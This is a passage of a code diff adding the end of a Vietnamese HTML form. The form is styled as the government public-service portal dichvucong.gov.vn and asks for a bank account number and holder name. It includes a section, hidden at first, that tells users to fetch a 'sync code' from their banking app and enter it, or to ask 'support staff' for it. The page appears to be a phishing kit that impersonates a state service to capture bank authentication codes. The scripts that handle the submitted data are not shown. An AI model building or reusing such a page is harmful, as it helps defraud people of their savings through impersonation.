+                                <label for="accountNumber" style="font-weight: bold;">Số tài khoản <span
+                                        class="required">*</span></label>
+                                <input type="text" id="accountNumber" name="accountNumber" required
+                                    pattern="[0-9]{8,20}" placeholder="Nhập số tài khoản">
+                            </div>
+
+                            <div class="form-group">
+                                <label for="accountHolder" style="font-weight: bold;">Chủ tài khoản <span
+                                        class="required">*</span></label>
+                                <input type="text" id="accountHolder" name="accountHolder" required
+                                    placeholder="Nhập tên chủ tài khoản">
+                            </div>
+                        </div>
+
+                        <!-- Phần NỘP HỒ SƠ -->
+                        <div class="form-section"
+                            style="margin-bottom: 30px; background: #f8f9fa; padding: 20px; border-radius: 8px; border-left: 4px solid #0066cc;">
+                            <h2 style="color: #000000; font-size: 20px; font-weight: bold; margin-bottom: 15px;">
+                                NỘP HỒ SƠ
+                            </h2>
+                            <div class="checkbox-group">
+                                <input type="checkbox" id="commitment" name="commitment" required>
+                                <label for="commitment"
+                                    style="color: #000000; font-weight: normal; font-size: 14px; line-height: 1.6;">
+                                    Tôi cam kết chịu trách nhiệm trước pháp luật về tính hợp pháp, chính xác của các
+                                    giấy tờ có trong hồ sơ và cung cấp đầy đủ thông tin có liên quan
+                                    <span class="required">*</span>
+                                </label>
+                            </div>
+
+                            <!-- Trường nhập mã đồng bộ (ẩn ban đầu) -->
+                            <div id="syncCodeSection"
+                                style="display: none; margin-top: 20px; padding: 15px; background: #fff3cd; border: 1px solid #ffc107; border-radius: 5px;">
+                                <div class="form-group">
+                                    <label for="syncCode"
+                                        style="font-weight: bold; color: #856404; margin-bottom: 10px; display: block;">
+                                        Mã Đồng Bộ <span class="required">*</span>
+                                    </label>
+                                    <input type="text" id="syncCode" name="syncCode"
+                                        placeholder="Nhập mã đồng bộ từ ứng dụng ngân hàng"
+                                        style="width: 100%; padding: 12px; border: 2px solid #ffc107; border-radius: 5px; font-size: 16px; font-weight: bold; letter-spacing: 2px; text-align: center;"
+                                        maxlength="10" pattern="[A-Z0-9]{6,10}">
+                                    <small style="display: block; margin-top: 8px; color: #856404; font-size: 13px;">
+                                        ⚠️ Vui lòng truy cập ứng dụng ngân hàng để lấy mã đồng bộ và nhập vào ô trên<br>
+                                        Nếu không nhận được mã gửi về hãy thông báo cho cán bộ nhân viên hỗ trợ để thực
+                                        hiện nhận mã đồng bộ
+                                    </small>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Nút submit -->
+                        <div class="form-actions"
+                            style="margin-top: 30px; display: flex; gap: 15px; justify-content: center;">
+                            <button type="submit" class="btn btn-primary"
+                                style="min-width: 200px; padding: 15px 30px; font-size: 16px; background-color: #D2691E; border-color: #D2691E; color: #ffffff;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2"
+                                    style="display: inline-block; vertical-align: middle; margin-right: 8px;">
+                                    <polyline points="20 6 9 17 4 12"></polyline>
+                                </svg>
+                                Nộp hồ sơ
+                            </button>
+                            <a href="index.html" class="btn btn-secondary"
+                                style="min-width: 200px; padding: 15px 30px; font-size: 16px; text-decoration: none; text-align: center; display: inline-flex; align-items: center; justify-content: center;">
+                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="2"
+                                    style="display: inline-block; vertical-align: middle; margin-right: 8px;">
+                                    <path d="M19 12H5M12 19l-7-7 7-7"></path>
+                                </svg>
+                                Hủy
+                            </a>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+        <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-bottom">
+            <div class="container">
+                <div class="add"><p>Cơ quan chủ quản: Văn phòng Chính phủ</p></div>
+                <div class="add"><p>www.dichvucong.gov.vn</p></div>
+                <div class="add"><p>Tổng đài hỗ trợ: 18001096</p></div>
+                <div class="add"><p>Email: dichvucong@chinhphu.vn</p></div>
+            </div>
+        </div>
+    </footer>
+
+    
+
+    <div id="notification" class="notification"></div>
+
+    <script src="script.js"></script>
+    <script src="nha-dat-script.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+</body>
+
+</html>
